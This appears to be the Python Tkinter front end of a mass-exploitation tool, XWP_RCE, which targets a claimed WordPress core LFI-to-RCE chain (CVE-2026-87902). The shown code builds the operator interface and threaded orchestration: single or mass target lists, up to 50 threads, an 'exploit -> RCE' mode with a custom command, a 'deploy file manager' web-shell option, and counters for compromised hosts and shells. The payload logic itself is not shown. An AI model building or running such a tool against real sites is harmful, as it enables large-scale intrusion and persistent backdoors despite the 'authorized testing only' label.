        tk.Label(info, text="WORDPRESS CORE  get_page_template()", bg=BG, fg=CYAN,
                 font=FONT_B).pack(anchor="w")
        tk.Label(info, text="UNAUTHENTICATED LFI  ->  PEAR GADGET  ->  RCE", bg=BG, fg=TEXT,
                 font=FONT).pack(anchor="w", pady=(2, 6))
        badges = tk.Frame(info, bg=BG); badges.pack(anchor="w")
        for txt, col in ((CVE, MAGENTA), ("CVSS 9.8", AMBER), ("CWE-22", CYAN),
                         ("WP 4.7.0 - 7.1.1", NEON)):
            tk.Label(badges, text=" " + txt + " ", bg=BG2, fg=col, font=FONT_S,
                     highlightthickness=1, highlightbackground=col).pack(side="left", padx=(0, 6))

    def _section(self, parent, title, color=NEON):
        wrap = tk.Frame(parent, bg=BG)
        wrap.pack(fill="x", pady=(0, 5))
        head = tk.Frame(wrap, bg=BG); head.pack(fill="x")
        tk.Frame(head, bg=color, height=12, width=3).pack(side="left")
        tk.Label(head, text="  " + title.upper(), bg=BG, fg=color, font=FONT_B).pack(side="left")
        tk.Frame(head, bg=BORDER, height=1).pack(side="left", fill="x", expand=True, padx=8)
        box = tk.Frame(wrap, bg=BG2, highlightthickness=1, highlightbackground=BORDER)
        box.pack(fill="x", pady=(3, 0))
        inner = tk.Frame(box, bg=BG2, padx=10, pady=7)
        inner.pack(fill="x")
        return inner

    def _config_panel(self, parent):
        # ── TARGET
        s = self._section(parent, "target", CYAN)
        row = tk.Frame(s, bg=BG2); row.pack(fill="x", pady=(0, 6))
        self.mode = tk.StringVar(value="single")
        self.rb_single = tk.Radiobutton(row, text="SINGLE", variable=self.mode, value="single",
                                        bg=BG2, fg=NEON, selectcolor=BG2, activebackground=BG2,
                                        activeforeground=NEON, font=FONT_B, bd=0, highlightthickness=0,
                                        command=self._sync_radios)
        self.rb_mass = tk.Radiobutton(row, text="MASS", variable=self.mode, value="mass",
                                      bg=BG2, fg=DIM, selectcolor=BG2, activebackground=BG2,
                                      activeforeground=NEON, font=FONT_B, bd=0, highlightthickness=0,
                                      command=self._sync_radios)
        self.rb_single.pack(side="left"); self.rb_mass.pack(side="left", padx=12)

        self.f_url = Field(s, "target url", tk.StringVar(value="http://target.local"), width=40)
        self.f_url.pack(fill="x", pady=(0, 6))
        self.f_list = Field(s, "target list (mass)", tk.StringVar(), width=40)
        self.f_list.pack(fill="x", pady=(0, 6))
        NeonButton(s, "  [ BROWSE LIST ]", self._pick, color=CYAN, wide=True).pack(fill="x")

        # ── MODE
        s = self._section(parent, "mode", AMBER)
        self.v_check   = tk.BooleanVar(value=False)
        self.v_exploit = tk.BooleanVar(value=True)
        self.v_shell   = tk.BooleanVar(value=True)
        self.v_verify  = tk.BooleanVar(value=False)
        for var, txt in ((self.v_check, "check-only"), (self.v_exploit, "exploit -> RCE"),
                         (self.v_shell, "deploy file manager"), (self.v_verify, "verify ssl")):
            NeonCheck(s, txt, var).pack(anchor="w")
        self.f_cmd = Field(s, "command", tk.StringVar(value="id"), width=24)
        self.f_cmd.pack(fill="x", pady=(6, 6))
        self.f_drop = Field(s, "drop dir", tk.StringVar(value="/tmp"), width=24)
        self.f_drop.pack(fill="x")

        # ── ADVANCED
        s = self._section(parent, "advanced", MAGENTA)
        g = tk.Frame(s, bg=BG2); g.pack(fill="x")
        for i in range(4): g.columnconfigure(i, weight=1)
        self.f_oracle = Field(g, "oracle", tk.StringVar(value=DEFAULT_ORACLE), width=10)
        self.f_depths = Field(g, "depths", tk.StringVar(value=",".join(map(str, DEFAULT_DEPTHS))), width=10)
        self.f_probe  = Field(g, "probe",  tk.StringVar(value="12"), width=6)
        self.f_thr    = Field(g, "threads", tk.StringVar(value="10"), width=6)
        for i, f in enumerate((self.f_oracle, self.f_depths, self.f_probe, self.f_thr)):
            f.grid(row=0, column=i, sticky="we", padx=(0, 6))
        self.f_segs = Field(s, "segments (theme page-* dirs)",
                            tk.StringVar(value=",".join(DEFAULT_SEGMENTS)), width=40)
        self.f_segs.pack(fill="x", pady=(6, 6))
        g2 = tk.Frame(s, bg=BG2); g2.pack(fill="x")
        for i in range(3): g2.columnconfigure(i, weight=1)
        self.f_to   = Field(g2, "timeout",  tk.StringVar(value="12.0"), width=8)
        self.f_max  = Field(g2, "max time", tk.StringVar(value="60.0"), width=8)
        self.f_prox = Field(g2, "proxy", tk.StringVar(), width=14)
        for i, f in enumerate((self.f_to, self.f_max, self.f_prox)):
            f.grid(row=0, column=i, sticky="we", padx=(0, 6))

        # ── RUN
        s = self._section(parent, "run", NEON)
        self.btn_start = NeonButton(s, "  [ START SCAN ]", self.start, color=NEON, wide=True)
        self.btn_start.pack(fill="x", pady=(0, 6))
        rowb = tk.Frame(s, bg=BG2); rowb.pack(fill="x")
        NeonButton(rowb, " [ STOP ] ", lambda: self.stop_flag.set(), color=MAGENTA).pack(side="left")
        NeonButton(rowb, " [ EXPORT ] ", self._export, color=CYAN).pack(side="left", padx=6)
        self.v_fx = tk.BooleanVar(value=True)
        NeonCheck(rowb, "matrix fx", self.v_fx, command=self._toggle_fx).pack(side="right")
        tk.Label(s, text="authorized testing only // usage without written consent is illegal",
                 bg=BG2, fg=DIMMER, font=FONT_S, wraplength=380, justify="left").pack(anchor="w", pady=(8, 0))

    def _results_panel(self, parent):
        # stats strip
        strip = tk.Frame(parent, bg=BG2, highlightthickness=1, highlightbackground=BORDER)
        strip.pack(fill="x", pady=(0, 8))
        self.stat_labels = {}
        for key, label, col in (("total", "SCANNED", CYAN), ("vuln", "VULNERABLE", NEON),
                                ("rce", "RCE", MAGENTA), ("shell", "SHELLS", AMBER)):
            cell = tk.Frame(strip, bg=BG2); cell.pack(side="left", padx=18, pady=8)
            tk.Label(cell, text=label, bg=BG2, fg=DIM, font=FONT_S).pack(anchor="w")
            lbl = tk.Label(cell, text="0", bg=BG2, fg=col, font=(FONT_FAMILY, 20, "bold"))
            lbl.pack(anchor="w")
            self.stat_labels[key] = lbl
        self.prog = tk.Frame(strip, bg=BG2, height=6)
        self.prog.pack(side="bottom", fill="x", padx=0)
        self.prog_bar = tk.Frame(self.prog, bg=NEON, height=4, width=0)
        self.prog_bar.place(x=0, y=1, relheight=1)
        strip.bind("<Configure>", self._resize_prog)

        # notebook
        nb = tk.Frame(parent, bg=BG2, highlightthickness=1, highlightbackground=BORDER)
        nb.pack(fill="both", expand=True)
        tabs = tk.Frame(nb, bg=BG2); tabs.pack(fill="x")
        self.tab_buttons, self.panels = {}, {}
        for key, txt, col in (("console", " CONSOLE ", CYAN), ("results", " RESULTS ", NEON)):
            b = tk.Label(tabs, text=txt, bg=BG2, fg=col, font=FONT_B, padx=14, pady=8, cursor="hand2")
            b.pack(side="left")
            b.bind("<Button-1>", lambda e, k=key: self._show_tab(k))
            self.tab_buttons[key] = b
        self.holder = tk.Frame(nb, bg=BG2); self.holder.pack(fill="both", expand=True)

        # console
        c = tk.Frame(self.holder, bg=BG2)
        self.console = tk.Text(c, bg="#05070a", fg=TEXT, font=FONT, relief="flat",
                               insertbackground=NEON, highlightthickness=0, bd=0, wrap="word",
                               padx=10, pady=8)
        self.console.pack(side="left", fill="both", expand=True)
        sb = tk.Scrollbar(c, command=self.console.yview, bg=BG2, troughcolor=BG,
                          activebackground=NEON, relief="flat", bd=0, width=10)
        sb.pack(side="right", fill="y")
        self.console.configure(yscrollcommand=sb.set)
        for tag, cfg in (("info", {"foreground": "#8b98a5"}),
                         ("dim", {"foreground": DIMMER}),
                         ("stage", {"foreground": CYAN}),
                         ("ok", {"foreground": NEON}),
                         ("warn", {"foreground": AMBER}),
                         ("err", {"foreground": MAGENTA}),
                         ("vuln", {"foreground": NEON, "background": "#00251a"}),
                         ("pwn", {"foreground": MAGENTA, "background": "#20000e"}),
                         ("shell", {"foreground": "#ffd400", "background": "#231a00"}),
                         ("banner", {"foreground": NEON})):
            self.console.tag_configure(tag, **cfg)
        self.panels["console"] = c

        # results
        r = tk.Frame(self.holder, bg=BG2)
        cols = ("target", "verdict", "version", "lfi", "rce", "shell")
        self.tree = ttk.Treeview(r, columns=cols, show="headings", style="Hack.Treeview")
        for c2, w, col in zip(cols, (230, 150, 80, 250, 190, 240),
                              (CYAN, NEON, CYAN, NEON, MAGENTA, AMBER)):
            self.tree.heading(c2, text=c2.upper())
            self.tree.column(c2, width=w, anchor="w", stretch=False)
        self.tree.pack(side="left", fill="both", expand=True)
        sb2 = tk.Scrollbar(r, command=self.tree.yview, bg=BG2, troughcolor=BG,
                           activebackground=NEON, relief="flat", bd=0, width=10)
        sb2.pack(side="right", fill="y")
        self.tree.configure(yscrollcommand=sb2.set)
        self.tree.tag_configure("vuln", foreground=CYAN)
        self.tree.tag_configure("pwn", foreground=MAGENTA, background="#18000b")
        self.tree.tag_configure("ok", foreground=NEON)
        self.panels["results"] = r
        self._show_tab("console")

    def _statusbar(self):
        bar = tk.Frame(self.root, bg=BG2, height=28, highlightthickness=1, highlightbackground=BORDER)
        bar.pack(fill="x", side="bottom")
        self.dot = tk.Canvas(bar, width=14, height=14, bg=BG2, highlightthickness=0)
        self.dot.pack(side="left", padx=(10, 4))
        self.dot_id = self.dot.create_oval(3, 3, 11, 11, fill=DIMMER, outline="")
        self.status = tk.StringVar(value="IDLE // awaiting target")
        tk.Label(bar, textvariable=self.status, bg=BG2, fg=DIM, font=FONT_S).pack(side="left")
        tk.Label(bar, text="CVE-2026-87902  |  %s" % GHSA, bg=BG2, fg=DIMMER,
                 font=FONT_S).pack(side="right", padx=10)

    # ─────────────────────── WIDGET BEHAVIOUR ───────────────────────
    def _sync_radios(self):
        on = self.mode.get() == "single"
        self.rb_single.configure(fg=NEON if on else DIM)
        self.rb_mass.configure(fg=DIM if on else NEON)

    def _toggle_fx(self):
        self.matrix.running = self.v_fx.get()
        if not self.matrix.running:
            self.matrix.delete("all")
        else:
            self.matrix._tick()

    def _show_tab(self, key):
        for k, p in self.panels.items(): p.pack_forget()
        self.panels[key].pack(fill="both", expand=True)
        for k, b in self.tab_buttons.items():
            b.configure(bg=BG3 if k == key else BG2)

    def _resize_prog(self, _=None):
        self._set_prog(self.stats["done"], self.stats["total"])

    def _set_prog(self, done, total):
        w = self.prog.winfo_width()
        frac = 0 if not total else max(0.0, min(1.0, done / float(total)))
        self.prog_bar.place(x=0, y=1, width=int(w * frac), relheight=1)

    def _refresh_stats(self):
        self.stat_labels["total"].configure(text=str(self.stats["done"]))
        self.stat_labels["vuln"].configure(text=str(self.stats["vuln"]))
        self.stat_labels["rce"].configure(text=str(self.stats["rce"]))
        self.stat_labels["shell"].configure(text=str(self.stats["shell"]))
        self._set_prog(self.stats["done"], self.stats["total"])

    def _pulse(self):
        self.pulse = (self.pulse + 1) % 20
        t = self.pulse / 20.0
        # interpolasi DIMMER -> NEON
        def mix(a, b, k):
            ah, bh = int(a[1:], 16), int(b[1:], 16)
            r = int((ah >> 16 & 255) * (1 - k) + (bh >> 16 & 255) * k)
            g = int((ah >> 8 & 255) * (1 - k) + (bh >> 8 & 255) * k)
            bl = int((ah & 255) * (1 - k) + (bh & 255) * k)
            return "#%02x%02x%02x" % (r, g, bl)
        col = mix(DIMMER, NEON, abs(0.5 - t) * 2) if self.running_scan() else DIMMER
        self.dot.itemconfigure(self.dot_id, fill=col)
        self.root.after(70, self._pulse)

    def running_scan(self):
        return self.stats["total"] > 0 and self.stats["done"] < self.stats["total"]

    # ─────────────────────────── ACTIONS ───────────────────────────
    def _pick(self):
        p = filedialog.askopenfilename(filetypes=[("Text", "*.txt"), ("All", "*.*")])
        if p: self.f_list.var.set(p)

    def _options(self):
        url = normalize(self.f_url.var.get())
        segs = [x.strip() for x in self.f_segs.var.get().split(",") if x.strip()]
        depths = [int(x) for x in self.f_depths.var.get().split(",") if x.strip()]
        if not depths: raise ValueError("depths kosong")
        return {"url": url, "listfile": self.f_list.var.get(), "verify_ssl": self.v_verify.get(),
                "proxy": self.f_prox.var.get().strip(), "timeout": float(self.f_to.var.get()),
                "max_time": float(self.f_max.var.get()), "probe": int(self.f_probe.var.get()),
                "segments": segs, "depths": depths,
                "oracle": self.f_oracle.var.get().strip() or DEFAULT_ORACLE,
                "command": self.f_cmd.var.get(), "drop": self.f_drop.var.get().strip() or "/tmp",
                "exploit": self.v_exploit.get() and not self.v_check.get(),
                "shell": self.v_shell.get(), "shell_file": None,
                "threads": max(1, min(50, int(self.f_thr.var.get() or 1)))}

    def start(self):
        try:
            o = self._options()
        except Exception as e:
            messagebox.showerror("Options", str(e)); return
        targets = []
        if self.mode.get() == "single":
            if o["url"]: targets = [o["url"]]
        else:
            if os.path.isfile(o["listfile"]):
                with open(o["listfile"], encoding="utf-8", errors="replace") as f:
                    targets = [l for l in f if l.strip() and not l.startswith("#")]
        if not targets:
            messagebox.showwarning("Target", "Tidak ada target yang valid."); return
        self.tree.delete(*self.tree.get_children())
        self.console.delete("1.0", "end")
        self.results = []
        self.stop_flag.clear()
        self.stats = {"total": len(targets), "done": 0, "vuln": 0, "rce": 0, "shell": 0}
        self._refresh_stats()
        threading.Thread(target=self._run, args=(targets, o), daemon=True).start()

    def emit(self, level, msg):
        self.queue.put(("log", (level, msg)))

    def _run(self, targets, opts):
        self.emit("banner", "┌─ XWP_RCE ─ CVE-2026-87902 ─ %d target(s) ─ threads=%d" % (len(targets), opts["threads"]))
        self.emit("dim", "└─ authorized testing only")
        lock = threading.Lock()

        def task(t):
            if self.stop_flag.is_set():
                return
            w = TargetWorker(opts, self.emit)
            try:
                res = w.process(t)
            except Exception as e:
                res = {"target": t, "verdict": "ERROR", "version": "", "lfi": "",
                       "rce": "", "shell": "", "detail": "exc: %s" % e}
            with lock:
                self.stats["done"] += 1
                if res["verdict"] == "VULNERABLE": self.stats["vuln"] += 1
                if res["rce"]: self.stats["rce"] += 1
                if res["shell"]: self.stats["shell"] += 1
                snap = dict(self.stats)
            self.queue.put(("row", res))
            self.queue.put(("stats", snap))
            lvl = ("vuln" if res["verdict"] == "VULNERABLE"
                   else "err" if res["verdict"] == "ERROR" else "info")
            self.emit(lvl, "[%d/%d] %s -> %s %s" % (snap["done"], snap["total"], t,
                                                    res["verdict"], res["detail"][:90]))

        try:
            with ThreadPoolExecutor(max_workers=opts["threads"]) as ex:
                list(ex.map(task, targets))
        finally:
            self.queue.put(("done", None))

    def _drain(self):
        try:
            while True:
                kind, payload = self.queue.get_nowait()
                if kind == "log":
                    level, msg = payload
                    self._log(msg, level)
                elif kind == "row":
                    self._add_row(payload)
                elif kind == "stats":
                    self.stats = payload
                    self._refresh_stats()
                elif kind == "done":
                    self.status.set("FINISHED // %d scanned, %d vulnerable, %d rce, %d shells"
                                    % (self.stats["done"], self.stats["vuln"],
                                       self.stats["rce"], self.stats["shell"]))
                    self.emit("banner", "└─ scan selesai")
        except queue.Empty:
            pass
        if self.stats["total"] and self.stats["done"] < self.stats["total"]:
            self.status.set("RUNNING // %d/%d  vuln=%d rce=%d shell=%d"
                            % (self.stats["done"], self.stats["total"], self.stats["vuln"],
                               self.stats["rce"], self.stats["shell"]))
        self.root.after(100, self._drain)

    def _log(self, msg, level="info"):
        ts = time.strftime("%H:%M:%S")
        self.console.insert("end", "[%s] " % ts, "dim")
        self.console.insert("end", msg + "\n", level)
        self.console.see("end")
        if level in ("vuln", "pwn", "shell"):
            self._show_tab("console")

    def _add_row(self, res):
        tag = ""
        if res["rce"]: tag = "pwn"
        elif res["verdict"] == "VULNERABLE": tag = "vuln"
        elif res["verdict"] == "NOT_VULNERABLE": tag = "ok"
        self.tree.insert("", "end", values=(res["target"], res["verdict"], res["version"],
                                            res["lfi"], res["rce"], res["shell"]), tags=(tag,))
        self.results.append(res)

    def _export(self):
        p = filedialog.asksaveasfilename(defaultextension=".csv",
                                         filetypes=[("CSV", "*.csv"), ("Text", "*.txt")])
        if not p: return
        with open(p, "w", encoding="utf-8") as f:
            f.write("target,verdict,version,lfi,rce,shell,detail\n")
            for r in self.results:
                f.write(",".join('"%s"' % str(r.get(k, "")).replace('"', "'")
                                 for k in ("target", "verdict", "version", "lfi", "rce", "shell", "detail")) + "\n")
        messagebox.showinfo("Export", "Tersimpan:\n%s" % p)

# ══════════════════════════════════════════════════════════════════════════
#  BOOTSTRAP
# ══════════════════════════════════════════════════════════════════════════
def boot():
    root = tk.Tk()
    fams = set(tkfont.families(root))
    global FONT_FAMILY
    FONT_FAMILY = next((f for f in MONO_CANDIDATES if f in fams), "TkFixedFont")
    global FONT, FONT_B, FONT_S
    FONT   = (FONT_FAMILY, 10)
    FONT_B = (FONT_FAMILY, 10, "bold")
    FONT_S = (FONT_FAMILY, 8)
    # Treeview style
    st = ttk.Style()
    try: st.theme_use("clam")
    except tk.TclError: pass
    st.configure("Hack.Treeview", background=BG2, fieldbackground=BG2, foreground=TEXT,
                 rowheight=24, borderwidth=0, font=FONT)
    st.configure("Hack.Treeview.Heading", background=BG, foreground=CYAN, relief="flat",
                 borderwidth=0, font=FONT_B)
    st.map("Hack.Treeview.Heading", background=[("active", BG3)])
    st.map("Hack.Treeview", background=[("selected", BG3)], foreground=[("selected", NEON)])
    st.layout("Hack.Treeview", [("Hack.Treeview.treearea", {"sticky": "nswe"})])
    HackerGUI(root)
    root.mainloop()

# placeholder agar nama font tersedia sebelum boot()
FONT_FAMILY, FONT, FONT_B, FONT_S = "TkFixedFont", ("TkFixedFont", 10), ("TkFixedFont", 10, "bold"), ("TkFixedFont", 8)

if __name__ == "__main__":
    boot()